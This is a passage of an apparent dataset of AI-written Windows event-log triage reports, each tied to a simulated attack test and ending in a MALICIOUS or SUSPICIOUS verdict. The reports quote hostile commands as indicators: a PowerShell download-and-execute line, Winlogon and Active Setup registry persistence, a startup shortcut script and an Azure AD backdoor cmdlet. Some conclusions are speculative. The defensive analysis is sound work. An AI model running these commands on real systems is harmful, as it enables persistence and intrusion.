
3. **Process Execution Patterns:**
   - Processes such as `wevtutil.exe` and `conhost.exe` were executed in close succession by the same user. While this may not be inherently malicious, in context with the PowerShell activity, it suggests the user might be trying to cover tracks or manipulate event logs, as `wevtutil.exe` is often used to query or clear event logs.

4. **Privilege Escalation and High Integrity Level:**
   - The PowerShell command was executed with high integrity level, suggesting elevated privileges were in use. This should be verified in context to ensure it aligns with normal behavior for the `admin_test` user.
   
5. **Time Changes:**
   - There are several logs indicating changes to the system time. Time manipulation can obfuscate logs and other timestamps which might help in covering tracks.

**Indicators of Malicious Activity or Compromise:**

- The registry modifications, especially in a system-wide context like `HKLM` registry changes, typically indicate an attempt to weaken security (e.g., disabling SmartScreen) or alter system behavior toward some unauthorized control.
- Usage of `PowerShell` for such scripts is common in advanced persistent threats (APTs) or during penetration testing exercises designed to evaluate system defenses stealthily.
  
### Assessment of the Situation

Given the combination of registry modifications via PowerShell, suspicious process activities, and the high integrity level under which these actions were performed, there is a strong suggestion of potentially malicious activity. The fact that this was executed by a user account (`admin_test`) with high privileges and no apparent legitimate system administrative task in context raises a red flag.

### Threats or Risks Identified

- **Potential Unauthorized Policy Changes:** The modifications could result in a less secure system setup.
- **Possibility of Payload Delivery or Persistent Threat:** The execution and script behavior may be part of a larger compromise strategy or payload installation.
- **Risk of Lateral Movement or Privilege Escalation:** If an attacker is indeed present, they may use these privileges to move laterally or escalate privileges further.

### Guidance on How to Proceed

1. **Immediate Investigation:**
   - Verify the legitimacy of the `admin_test` user's actions. Check with involved personnel or related records whether the activity was known and authorized.
   
2. **Contain and Control:**
   - If unauthorized activity is suspected, isolate the affected system from the network to prevent lateral movement.
   
3. **Forensic Analysis:**
   - Conduct a thorough forensic analysis. Take a memory dump and analyze it for other indicators of compromise.
   - Review network logs or additional system logs around the timeframe for signs of data exfiltration or additional unauthorized access.

4. **Incident Response:**
   - Engage the incident response team to assess broader impact, ensure patches and updates are applied, and correct any configuration changes made.

5. **Security Measures:**
   - Implement monitoring for similar activities across other systems.
   - Enforce least privilege access and evaluate the necessity of admin-level accounts having high integrity privileges.

Based on the evidence presented through the logs, my assessment is that the resolution for this situation should be classified as:

**MALICIOUS**"
Azure AD Application Hijacking - App Registration,"Based on my analysis, the provided logs indicate potentially malicious activity on the system ""Server002."" Here are the key observations:

1. **Unusual PowerShell Activity**: 
   - The Sysmon logs show multiple instances of PowerShell execution: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
   - The PowerShell command line includes suspicious behavior: importing the AzureAD module, creating a new credential with plaintext password (""p4sswd""), and attempting to connect to AzureAD. The operation involves asymmetric key creation and connection to AzureAD, which could indicate an attempt at application hijacking.

2. **Command Obfuscation and Execution**: 
   - The PowerShell command line shows obfuscated text and operations to set up AzureAD credentials and certificate management. This type of scripting is often seen in advanced malicious operations aiming to maintain persistent unauthorized access.
   - There are operations to generate self-signed certificates and hijack AzureAD applications, as indicated by jargons like ""Application Hijacking worked"" printed in the logs, which suggest a simulated attack or test scenario.

3. **Use of Administrative Privileges**:
   - The user executing the suspicious commands is listed as ""SERVER002\\admin_test,"" which is an admin-level user. Admin privileges being used for such operations increases the risk and capability of the actions being taken.

4. **Security Log Events**:
   - Several Windows Security Auditing events indicating failed credential operations (`EventID: 5379`) and subsequent successful logon as ""NT AUTHORITY\\SYSTEM"" (`EventID: 4624`), raising the suspicion of attempts to gain system-level accesses.

5. **Process Execution Tracing**:
   - Events show sequences of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe` being executed in close succession, which could suggest scripting of tasks or potential reconnaissance activity on the system.

The behavior in these logs points toward orchestrated actions using PowerShell scripting for credential access and manipulation within AzureAD, with attempts to create backdoor access through certificate creation. This is indicative of malicious intent, likely simulating or attempting to conduct a sophisticated attack.

**Resolution**: MALICIOUS - The logs exhibit clear indicators of compromise and malicious intent involving unauthorized access and manipulation of credentials, suggesting potential breach activities. Immediate remediation actions should be taken, including isolating the affected host, conducting a thorough investigation, rotating potentially compromised credentials, and reviewing AzureAD and other access logs for further suspicious activity."
Add Federation to Azure AD,"### Analysis of Logs:

**1. Overview of Sysmon Logs:**
- The Sysmon logs primarily indicate the execution of various native Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. 
- These processes were executed under the user `SERVER002\admin_test`.

**2. Examination of `wevtutil.exe` and `conhost.exe`:**
- Frequent execution of `wevtutil.exe` and `conhost.exe` might seem normal as they are legitimate Windows utilities. `wevtutil.exe` is used for querying and managing event logs and `conhost.exe` is the console window host.
- However, without additional context such as command-line arguments or specific actions performed, these entries alone are ambiguous in determining malicious intent.

**3. Examination of PowerShell Activity:**
- The PowerShell execution raises significant red flags. The command line used attempts to:
  - Import modules `AzureAD` and `AADInternals`.
  - Utilize a hardcoded password to create a credential object.
  - Connect to Azure Active Directory using `Connect-AzureAD`.
  - Check domain properties such as verification status and authentication type.
  - Attempt to leverage `ConvertTo-AADIntBackdoor` to establish unauthorized access and modify domain federation settings.

- This behavior is extremely suspicious and indicative of potential malicious intent, specifically attempts to backdoor or manipulate Azure AD configurations unauthorizedly.

**4. Risks Identified:**
- The use of AADInternals and attempts to execute backdoor actions in Azure AD suggest an attempt to compromise and gain unauthorized access to Azure resources.
- Hardcoding credentials within scripts and bypassing typical security checks could expose the organization to brute force and credential theft attacks.

### Assessment and Recommended Action:

- **Resolution: MALICIOUS -** The execution of the PowerShell command with intentions of manipulating Azure AD configurations using potentially malicious scripts/tools clearly indicates malicious activity.
- **Recommended Actions:**
  - Immediate investigation and containment of the `SERVER002` machine to prevent further unauthorized access or execution of the malicious script.
  - Audit Azure AD logs to identify any unauthorized changes or accesses.
  - Revoke and reset credentials for `bruce.wayne@contosocloud.com` and other potentially compromised accounts.
  - Strengthen PowerShell execution policies and monitoring for adverse activity patterns in the network.
  - Conduct a full security review of IT systems and policies to prevent recurrences.
  
This situation demands swift response actions to ensure any unauthorized changes are identified and rectified promptly."
Shellcode execution via VBA,"Upon analysis of the provided logs, several indicators suggest potentially malicious activity on the host machine (SERVER002) used by the user ""admin_test"". Here is a breakdown of the suspicious activities observed from the logs:

1. **PowerShell Execution with External Script**:
   - The Sysmon and PowerShell logs recorded several PowerShell executions using the command:
     ```
     ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, IEX (iwr ""<https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1>"" -UseBasicParsing), Invoke-Maldoc -macroFile ""<C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\x64\\data-macrocode.txt>"" -officeProduct ""Word"" -sub ""Execute""}
     ```
   - This command involves downloading and executing a script from an external source (GitHub), which is a common tactic used in cyber attacks to execute payloads remotely.

2. **Use of Wevtutil and Conhost**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed. `wevtutil.exe` is commonly used to manage and clear event logs, potentially to cover tracks of malicious activity.
   - The use of `conhost.exe` alongside these processes may indicate attempts to execute console applications, possibly in an attempt to obscure actions from regular observation.

3. **Execution of Commands to Gather System Information**:
   - Commands such as `Hostname.exe` and `whoami.exe` are observed. While benign as individual actions, in conjunction with the downloading and execution of external scripts, they could indicate reconnaissance activity by an attacker to gather information about the system and its users.

4. **High Privilege Execution**:
   - The events are marked with a High Integrity Level, suggesting that the commands are being executed with elevated privileges, which can be indicative of an attempt to exploit or alter system configurations maliciously.

Given these observations, the overall assessment of the situation leads to the ""MALICIOUS"" resolution. The activities involve downloading and executing potentially harmful scripts coupled with attempts to gather system information and potentially alter system configurations using elevated privileges.

### Threats and Risks Identified:
- Possible execution of malicious script through PowerShell, which could lead to data exfiltration, system compromise, or further command and control actions.
- Attempts to obscure or clear logging activity, indicating an effort to hide malicious activity.
- Execution of reconnaissance commands within a high-privilege context, enhancing the threat landscape if control is established by the attacker.

### Guidance on How to Proceed:
- Immediate containment action should be taken to isolate the affected system (SERVER002) from the network.
- A comprehensive forensic analysis should be executed to understand the full scope of the compromise.
- Review and audit all systems with similar configurations to ensure no other machines are compromised.
- Reset credentials and implement additional Access Control measures for the accounts involved.
- Review and apply necessary security patches and updates to mitigate vulnerabilities.
- Enhance monitoring and logging to detect similar behaviors in future, incorporating specific IOCs from this analysis."
Process Injection via C#,"Based on the analysis of the provided log entries, several activities can be identified that could potentially indicate suspicious or malicious behavior:

1. **Use of `cmd.exe` with Unusual Command Line:**
   - A `cmd.exe` process was launched with the command line `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\data.exe""`. This command appears suspicious because it is attempting to execute an executable (`data.exe`) from a temporary directory, which is a common indicator of a potentially malicious or unauthorized operation.

2. **Frequent Execution of `wevtutil.exe`:**
   - The logs show repeated execution of `wevtutil.exe`, a command line utility for managing Windows Event Logs. This could be indicative of an attempt to clear or manipulate event logs to hide malicious activity.

3. **Time Discrepancies:**
   - There is evidence of time discrepancies and potential tampering with the system clock. Events in both the system and security logs indicate changes in system time, which could be an attempt to cover tracks or interfere with event log correlation.

4. **Execution of PowerShell with Admin Rights:**
   - A PowerShell session was initiated by a user (`SERVER002\\admin_test`), potentially indicating administration level access. PowerShell is often used in attack chains for reconnaissance or execution of malicious scripts or commands.

**Assessment and Recommendations:**
- **Suspicious Activity:** The execution of `data.exe` from a temporary path via `cmd.exe`, potential manipulation of event logs using `wevtutil.exe`, and adjustments to system time are indicative of suspicious activities that warrant further investigation.
- **Next Steps:**
  1. **Isolate the System:** Immediately isolate the system from the network to prevent potential lateral movement or data exfiltration.
  2. **Conduct a Full Malware Scan:** Use updated anti-malware software to perform a comprehensive scan of the system for known threats.
  3. **Review User Activity:** Check user access logs and permissions of the account `admin_test` to determine if unauthorized access occurred.
  4. **Examine `data.exe`:** Investigate the executable `data.exe` for malicious payloads by uploading it to a malware analysis sandbox if available.
  5. **Audit Systems Logs:** Correlate this activity with other systems to identify if this was part of a broader coordinated attack.
  6. **Review Security Posture:** Ensure that best practices for security, such as least privilege user management and endpoint detection tools, are implemented.

Given these findings, the activity captured in the logs aligns with the resolution of **SUSPICIOUS** and requires a deeper investigation to determine if there is indeed a compromise and to assess the full scope and impact of any potential breach."
Azure AD - adding permission to application,"**Analysis of the Logs:**

1. **Sysmon Log Events:**

   - **PowerShell Invocation:** At ""2024-10-24 10:02:15.4918166,"" a potentially suspicious PowerShell command is executed. It involves importing AzureAD module and creating new Azure AD applications and service principals. The command is executed under the account `SERVER002\admin_test`.

   - **Frequent Conhost Executions:** Numerous instances of `conhost.exe` are seen, often associated with command-line processes, which can be common but interesting to note due to frequent calls after other process executions.

   - **Event Utility Tool (wevtutil.exe) Usage:** Multiple occurrences of `wevtutil.exe` are seen in quick succession. This tool is used to manage Windows event logs, which could indicate attempts to clear or manipulate event logs, although it can be legitimate administrative activity as well.

2. **PowerShell Log Events:**

   - **Command Execution:** The PowerShell script contains importing of AzureAD module, creating credentials, connecting to Azure AD, and setting application permissions to Azure AD applications. The hardcoded password ""p4sswd"" in a PowerShell script is a significant finding due to security concerns and improper handling of credentials.

3. **Event Execution Patterns:**

   - **Consistent User:** All the activities are executed by the `SERVER002\admin_test` user, which is a test admin account, and deserves scrutiny especially for executing extensive PowerShell commands with high privileges.

   - **High Integrity Level:** The processes run at a high integrity level, indicating they have elevated permissions, potentially allowing system-level changes.

4. **Assessment of Malicious Activity:**

   - The creation of Azure AD applications and service principals, especially via script, could indicate legitimate administrative tasks. However, it poses a threat if misused or implemented by an unauthorized user, potentially indicating initial stages of compromised behavior or insider threat.

   - The usage of `wevtutil.exe` is suspicious when viewed in conjunction with other activities but is not outright malicious without further context.

**Clear Assessment:**

Based on the PowerShell script execution, unnecessary hardcoding of passwords, and manipulation of AzureAD, these activities could potentially suggest malicious intent, or at the least, insecure practices needing rectification or further scrutiny due to:

- Creating new Azure AD entities and assigning permissions could expose the environment to external threats if unauthorized.

- The potential mishandling of credentials, storing sensitive information in scripts is poor security practice and should be corrected immediately.

**Resolution: SUSPICIOUS**

Activities observed are suspicious due to script-based administrative actions, possible mishandling of credentials, and could require deeper investigation to confirm if actions were carried out as part of authorized and legitimate administrative tasks or a security breach attempt. Immediate action steps include:

- **Review and Verification:** Verify the intent behind PowerShell executions and user role and permissions used.
- **Credential Handling Policies:** Enforce secure credential handling and review scripts for insecure practices.
- **Activity Correlation:** Cross-reference these logs with other systems or security events for further context.
- **Increase Monitoring:** Use additional monitoring on 'SERVER002\admin_test' and ensure logging activities are strictly adhered to security policies."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"Upon reviewing the provided Windows event logs, here is my analysis highlighting suspicious behavior, potential signs of compromise, and a resolution:

### Analysis:
1. **Unusual PowerShell Activity:**
   - Multiple PowerShell events (EventID: 600) indicate the execution of a PowerShell script through `powershell.exe` with the command `{C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\EtwpCreateEtwThread.exe -debug}`. This script is running from a temporary directory, which is often leveraged in attacks to execute malicious code.
   - The naming `EtwpCreateEtwThread.exe` is suspicious, as it does not resemble typical administrative tasks and may be indicative of a tool being used for malicious purposes, such as debugging or dynamically analyzing the environment.

2. **Elevated Privileges:**
   - Security logs indicate that user `admin_test` had elevated privileges during logon events (EventID: 4672), with high-integrity level sessions and privileges such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`.
   - These privileges are often used for debugging purposes, analyzing processes, and potentially hijacking system processes, which could be related to malicious activity.

3. **Related Sysmon Activity:**
   - Sysmon logs show numerous commands such as `whoami` and `wevtutil` being executed by the same user `admin_test` (EventIDs: 1 and 5). The use of `whoami` may indicate reconnaissance activities, and `wevtutil` might be used to configure or clear logs, potentially to hide malicious actions.
   - The process `conhost.exe` is observed multiple times; it is used to interact with console programs, possibly indicating scripts or tools that are programmatically operating on the command line.

4. **Network Activity:**
   - The security log shows NTLM logons (LogonType: 3) from an external workstation `DESKTOP-3HL5B2P` via connection over IPv6, which might suggest remote access activity potentially aligned with lateral movement or an attack originating from outside the internal network.

### Assessment:
- There are indicators of potentially malicious activities based on:
  - The execution of likely unmanaged or unknown binaries from a temporary directory.
  - The elevation of privileges allowing potentially harmful operations.
  - The involvement of processes often associated with reconnaissance and log manipulation.
  - External network access and remote logon, possibly without proper authorization.

### Resolution:
- **SUSPICIOUS**: The activities recorded in the logs suggest potentially unauthorized or malicious actions that do not appear to be legitimate business operations. Further investigation is warranted to determine if these actions were conducted by an authorized user or if they reflect malicious intent.
  
### Guidance on How to Proceed:
1. **Immediate Containment:**
   - If not already done, isolate `Server002` from the network to halt further potential compromise.
   
2. **Detailed Investigation:**
   - Correlate the IP address and domain/login events to verify sources and legitimacy.
   - Investigate the executable `EtwpCreateEtwThread.exe` for signs of known malware signatures or suspicious behavior.
   - Analyze the network flow and firewall logs for connections coming from or going to the identified external addresses.
   
3. **Remediation:**
   - Review and potentially revoke unnecessary elevated privileges for the user `admin_test`.
   - Conduct a full malware scan on the host and review all processes and scheduled tasks for irregularities.
   - Ensure logs are retained for future incident reviews and potentially contact law enforcement if a breach is confirmed.

4. **Post-Incident Measures:**
   - Implement enhanced endpoint monitoring to detect similar patterns.
   - Educate users on security protocols and ensure strong authentication methods are in place, especially for privileged accounts."
Domain Password Policy Check: No Uppercase Character in Password,"Upon reviewing the provided Windows event logs, there are several aspects that stand out as potentially suspicious and warrant further examination.

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs reveal several execution attempts concerning password management. The script aims to check for a stored password file and compares it to a hardcoded password ""lower-long-special-333"". If there's a match, it prompts the user to change it. Otherwise, it attempts to change the Active Directory account password to this hardcoded value and stores it back in a secure string format.
   - This activity is suspicious because:
     - Hardcoding passwords within scripts is a security risk and a bad practice. Further, storing or managing passwords in such a manner can lead to exposure.
     - Automated password changes using a script could be employed either legitimately for maintenance or maliciously for unauthorized access.
   
2. **Account and Group Enumeration:**
   - The security logs indicate several events (`EventID: 4798`) initiated by `CompatTelRunner.exe` checking user accounts, including high-privileged accounts such as ""Administrator"", and group queries (`EventID: 4799`). This behavior suggests enumeration activity, potentially as reconnaissance for further malicious actions.

3. **Sysmon Events:**
   - There are multiple process creations involving system utilities such as `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` under the user `admin_test`.
   - These utilities can be used legitimately, but they are also common in attack scenarios for identity detection, environment inspection, and log management.

### Assessment:

Based on the above observations, this activity is classified as **SUSPICIOUS**. 

- The execution of scripts altering account passwords, particularly through PowerShell, alongside system utility usage, commonly resonates with post-exploitation techniques.
- The enumeration of accounts and groups is consistent with reconnaissance often seen before privilege escalation or lateral movement attempts.

### Recommendations:

- **Immediate Investigation:** Conduct further analysis on process chains and network logs to identify any potential connections or data exfiltration instances.
- **Review and Audit:** Check for other signs of compromise such as unauthorized account creations, privilege escalations, or data modifications shortly after the suspicious activities.
- **Password and Security Policy Review:** Consider auditing password policies and enforcing stronger authentication practices to mitigate unauthorized access possibilities.
- **Monitor PowerShell Logs:** Establish real-time monitoring, alerting, and proper logging (e.g., PowerShell transcription and module logging) to detect future suspicious script executions.

In summary, the presence of unauthorized PowerShell scripting with hardcoded credentials, combined with user and system enumeration activities, are red flags indicating potential malicious activity or preparation for such within the network. Further investigation should be prioritized to determine if this is a benign script erroneously flagged or a compromised scenario."
secedit used to create a Run key in the HKLM Hive,"In reviewing the provided Windows event logs, I have conducted a detailed analysis to identify and assess any indications of suspicious or potentially malicious activity.

### Detailed Analysis:

1. **Software Protection Platform Service Events (Application Log)**:
   - The software protection platform service events (Security-SPP EventID 16384) indicate periodic system checks which are standard operations. No anomalies here.

2. **Edge Update Service Events (Application Log)**:
   - Multiple stops for the EdgeUpdate service were logged, which can be indicative of normal update operations.

3. **Time Change Events (System and Security Log)**:
   - There are indications of time adjustments through multiple events across the system and security logs (event ID 4616 in Security log, and Kernel-General EventID 1 in System log). These events indicate changes in system time, which could be a legitimate operation when synchronizing with time servers. This should be monitored due to the potential for abuse if lots of unplanned time changes occur, but in isolation, they don’t seem malicious.

4. **Sysmon Process Creation Events**:
   - Numerous events involving legitimate Windows utilities (`cmd.exe`, `whoami.exe`, `wevtutil.exe`, `hostname.exe`) initiated by the user `SERVER002\admin_test` were observed. These are common administrative actions, which themselves don't indicate malicious activity but warrant context checking.
   - An entry of particular interest involves the execution of `cmd.exe` with the command line including `secedit /import /db mytemplate.db /cfg ...`. SecEdit is a legitimate tool for configuring security policies but can be used for malicious configuration changes. Reviewing user and configuration context is recommended.
   - The frequent usage and sequence of these utilities mirror administrative tasks more than unauthorized activities. However, the use of `secedit` to modify security templates could potentially be used with malicious intent depending on the configurations enacted. 

5. **Microsoft Edge Update Process Events (Sysmon Log)**:
   - Multiple processes related to Microsoft Edge updates were initiated, which aligns with normal activities for software maintenance.

### Assessment:
- **SUSPICIOUS**: While there is abundant activity suggesting that there are benign reasons underlying most of the events, the repeated use of `secedit` for configuration changes justifies closer scrutiny. This particular kind of action can be leveraged for escalation or altering of security settings and therefore needs verification against intended administrative tasks.

### Guidance:
- **Verification**: Clarify with IT whether recent administrative tasks were performed to reflect the observed patterns, especially concerning the use of security configuration tools like `SecEdit`.
- **Review Security Policies**: Examine the specific configurations imported with `secedit` to ensure they align with security policies.
- **Monitoring and Alerting**: Enhance monitoring for similar patterns in Sysmon logs, focusing on unexpected or out-of-schedule usage of administrative tools.
- **User Validation**: Confirm that the actions by `SERVER002\admin_test`, particularly around security configuration changes, were intended and authorized by the relevant policies.

In conclusion, while many of the logs reflect routine operations, the combination and context of events suggest that the activity needs further investigation to ascertain its legitimacy and ensure system security is not at risk."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"After reviewing the provided Windows event logs for Server002, the following key observations and analyses can be made:

### Suspicious or Anomalous Behavior

1. **Execution of PowerShell with Unusual Commands:**
   - A PowerShell command is executed which includes setting a registry key (`HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`) with a `StubPath` pointing to `C:\Windows\System32\calc.exe`. This is not typical behavior for standard operations and might indicate an attempt to create a persistence mechanism using Active Setup.
   - Command: `Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""C:\Windows\System32\calc.exe"" -Force`

2. **Usage of RunOnce with an AlternateShellStartup:**
   - The PowerShell command included `runonce.exe /AlternateShellStartup`. This could indicate an attempt to trigger something (like `calc.exe`) at logon, using RunOnce as a mechanism.
   
3. **Frequent Execution of System Utilities:**
   - Multiple executions of `whoami.exe` and `hostname.exe` which might be part of a lateral movement or information-gathering phase.
   - Repeated execution of `conhost.exe` following commands like `whoami.exe`, potentially indicating attempts to mask activities in the console environment.
   
4. **Microsoft Edge Update Components Executions:**
   - While `MicrosoftEdgeUpdate.exe` executions are legitimate when updating Microsoft Edge, the context of the suspicious PowerShell activity raises concerns about its potential misuse. However, from the logs, these Edge Update processes seem benign and part of an update routine.

5. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is seen executing frequently. It is a legitimate tool for managing Windows Event Logs, but frequent calls could indicate either legitimate log management or potentially malicious activity attempting to clear or manage logs to cover tracks.

### Assessment of Situation

The logs show potentially malicious activity involving PowerShell execution used for setting registry keys and possibly creating persistence mechanisms via Active Setup. The command involves setting up a `StubPath` registry key to launch `calc.exe`, which is a known benign executable that attackers sometimes use to test their persistence methods without alerting the user immediately. This approach is a common technique used by attackers for persistence, suggesting that a compromise has occurred.

### Resolution

**MALICIOUS** - Based on the identified behaviors, particularly the PowerShell command implying persistence setup and the subsequent RunOnce execution, I am confident in classifying this activity as malicious. The behaviors align with tactics used by attackers to establish and maintain access on a compromised system.

### Guidance and Next Steps

1. **Immediate Quarantine:** Isolate the machine (Server002) from the network to prevent further potential compromise to other systems.
2. **Further Forensic Analysis:** Conduct a deeper forensic investigation to determine the initial attack vector and scope of the compromise.
3. **Registry and File System Checks:** Review the registry keys affected and any other potential changes in critical system paths.
4. **Check for Persistence:** Look for additional signs of persistence mechanisms, including other logon scripts, scheduled tasks, or system services.
5. **Review Administrator Accounts:** Check if any unauthorized changes have been made to user permissions, especially for privileged accounts.
6. **Update Security Software:** Ensure all endpoint detection and response (EDR) solutions are updated with latest definitions.
7. **User Awareness:** Inform users of suspicious activities and provide guidance on phishing mitigation techniques.

By addressing these areas, you aim to contain the compromise and prevent future incidents of a similar nature."
Process Injection with Go using CreateThread WinAPI (Natively),"### Analysis of Windows Event Logs

#### Observations:

1. **Suspicious TimeChange Events:**
   - The Security log shows two events (Event ID: 4616) where the system time was changed. Time changes are logged for `svchost.exe`, which runs under the `LOCAL SERVICE` account. Although this could be a part of legitimate time synchronization, it's unusual if unplanned and can be used to disguise malicious activity.

2. **Process Execution:**
   - **Sysmon logs show multiple executions** of `wevtutil.exe` and `conhost.exe` through the user `SERVER002\admin_test`. The frequent and successive execution of `wevtutil.exe` could indicate event log manipulation, and `conhost.exe` spawns could be linked to other utility executions. 
   - **PowerShell Activity:** The `PowerShell` log indicates execution of PowerShell scripting (Event ID: 600) by `admin_test`. The command in particular is noteworthy: `CreateThreadNative.exe -debug` from a temporary directory, which suggests the execution of a potentially suspicious executable using PowerShell. This pattern of using PowerShell to execute from temporary directories is often linked with unauthorized activities.

3. **Process Integrity and User Context:**
   - High integrity levels for processes, including `PowerShell`, signify potential privilege escalation. The processes initiated by the user `SERVER002\admin_test` maintain a high integrity level.

4. **Parent-Child Relationships:**
   - PowerShell operates as a parent process to other common utilities like `conhost.exe`. The chain of `wsmprovhost.exe → PowerShell → CreateThreadNative.exe` implies possible abuse of legitimate administrative tools for malicious purposes.

5. **Other Indicators:**
   - The activity around `CreateThreadNative.exe` raises especially high suspicion given its unconventional path and non-standard command-line usage, which is often linked with malware activity aiming to evade typical detection by using native processes for execution.

#### Assessment:
- **Potential Malicious Activity Detected:** 
  - The combination of time changes, suspicious uses of `PowerShell` and `wevtutil.exe`, and potentially malicious process execution strongly suggest activities that might not be authorized or are part of evasion strategies.

#### Identified Threats and Risks:
- **Time Manipulation** could be used for disguising timestamps related to malicious actions performed on the system.
- **Executable from Temp Directory:** The initiation of executables such as `CreateThreadNative.exe` from a temp directory is a common tactic used for lateral movement or execution of payloads.
- **Log Manipulation:** Use of `wevtutil.exe` pervasively suggests an attempt to cover or manipulate logs to prevent detection or forensic analysis.

#### Recommendations:
1. **Immediate Security Measures:**
   - Isolate the affected system (Server002) to prevent further potential spread or damage.
   - Analyze the binary `CreateThreadNative.exe` from the AppData Temp directory to verify its function and origin.
   - Further investigate the `SERVER002\admin_test` user account for unauthorized access activities or privilege anomalies.
   
2. **System Audit and Monitoring:**
   - Conduct a comprehensive audit of other systems for similar patterns, especially PowerShell script execution from temporary directories.
   - Intensify monitoring on the network for any traffic from this system linking out to unknown external addresses.

3. **Review Security Policies:**
   - Evaluate and potentially limit the use of PowerShell and administrative tools like `wevtutil.exe` without proper logging and oversight.

4. **Log Retention and Alerting:**
   - Ensure logs from all Windows Event categories are captured and stored securely for an extended period to allow for historical analysis if new indicators are discovered.

### Conclusion:
Based on the evidence and patterns detected, the resolution for this analysis is **MALICIOUS**. The aforementioned activities align with potential malicious exploitation scenarios typically associated with system compromise. Immediate response actions should be taken to investigate, remediate, and secure the environment."
Add Executable Shortcut Link to User Startup Folder,"### Detailed Analysis of Event Logs

#### PowerShell Logs
The PowerShell events reveal a script executed with the following command:

```powershell
$Target = ""C:\Windows\System32\calc.exe""
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
```

This command is creating a shortcut for `calc.exe` in the startup folder, ensuring that the calculator application will open every time the user logs in. While `calc.exe` itself is not malicious, using PowerShell to create startup items can be indicative of persistence techniques often used in malware.

#### Sysmon Logs
The Sysmon events display numerous system-related activities, primarily concerning various legitimate Windows processes such as `whoami.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe`. Notably, the Edge Update processes seem legitimate and are owned by the `NT AUTHORITY\SYSTEM` account, usually signifying a system-initiated update process.

However, there is a repeated creation of processes like `wevtutil.exe` initiated by the user `admin_test`. `wevtutil.exe` can be used for legitimate purposes, such as managing event logs, but it can also denote an attempt to clear logs, suggesting an intention to hide activities. 

#### Application Log
The Application log shows benign entries related to service stopping and status updates of systems like Windows Defender. Windows Defender is active, which typically suggests that the system is protected against known threats.

#### System Log
System logs indicate normal operations with updates being applied to Microsoft Defender Antivirus.

### Assessment
- **Suspicious Activity:** The use of PowerShell to create a persistent startup shortcut is suspicious. This technique could be used to maintain access to the system or for executing unwanted applications upon user login.
- **Potential Indicators of Compromise:** The `wevtutil.exe` execution could imply log tampering attempts, which are often indicative of malicious activities seeking to obfuscate their presence.

### Guidance
- **Further Investigation Needed:** Given the suspicious use of PowerShell and potential log tampering attempts, further investigation should focus on:
  - Verifying the source and purpose of the PowerShell script. Determine if this was an intended script conducted by an administrator or if it's a new/unapproved script.
  - Examining the intention behind `wevtutil.exe` usage and checking for any signs of log clearing or tampering.
  - Scrutinizing any recent changes or access rights that could allow unauthorized execution of commands.

The Windows logs contain activities that do not outrightly identify known malware but show potential techniques typically adopted during suspicious or malicious activities. Hence, the determination is:

### Resolution: SUSPICIOUS

The logs show activities needing additional investigation to rule out or confirm malicious intent."
Winlogon HKLM Userinit Key Persistence - PowerShell,"Upon analyzing the provided logs, several areas of concern suggest potential malicious activity:

### Suspicious Indicators:
1. **Registry Modification via PowerShell:**
   - There is a PowerShell command that attempts to modify a registry key in the `Winlogon` path: 
     ```
     Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe""
     ```
   - This command modifies the startup behavior of user sessions, potentially allowing for unauthorized command prompt execution upon logon, which is a classic technique used in persistence mechanisms by malware. 

2. **High-Integrity PowerShell Execution:**
   - The PowerShell script modifying the registry was executed with High integrity, indicating it had administrative privileges. This is commonly leveraged by attackers to escalate privileges and maintain persistence on the system.

3. **Unusual Process Activity:**
   - Multiple instances of standard system executables like `whoami.exe`, `hostname.exe`, and `conhost.exe` are used to potentially cover tracks or execute commands indirectly.
   - While these executables are legitimate, their frequent invocation in a short timespan without user-initiated events is suspicious, especially when linked to a user account with high privileges.

4. **EdgeUpdate Execution:**
   - Numerous entries show `MicrosoftEdgeUpdate.exe` processes running under the `NT AUTHORITY\SYSTEM` account. While Edge updates are standard, the frequency and context should be cross-verified with scheduled updates to ensure legitimacy and rule out misuse for lateral movement.

5. **Time Discrepancy in Security and System Logs:**
   - Anomalies in time settings, such as changes to the system time, might indicate an attempt to evade detection by altering timestamps.

### Conclusion:
Based on the provided log files, especially given the registry modification via PowerShell, I assess the situation as:
- **MALICIOUS**

### Recommendation:
- **Immediate Response Action:**
  - Isolate the affected host to prevent potential lateral movement or further compromise.
  
- **Forensic Investigation:**
  - Conduct a thorough analysis of the filesystem, registry keys modified, and any dropped files.
  - Review scheduled tasks or startup items for unauthorized entries.

- **Mitigation and Reporting:**
  - Restore the `Winlogon` registry key to its previous state to prevent the unauthorized execution of `cmd.exe` during logon.
  - Document and report the incident as part of security compliance and communicate the findings with the incident response team for further action.

Given these observations, the logs indicate definite signs of compromise and warrant a comprehensive remedial action plan."
Process Injection via Extra Window Memory (EWM) x64 executable,"Upon analyzing the provided Windows event logs for potential indicators of malicious activity, several key observations can be made. Let's break down the findings across different logs and assess the situation.

### Event Log Analysis:

1. **Security Log:**
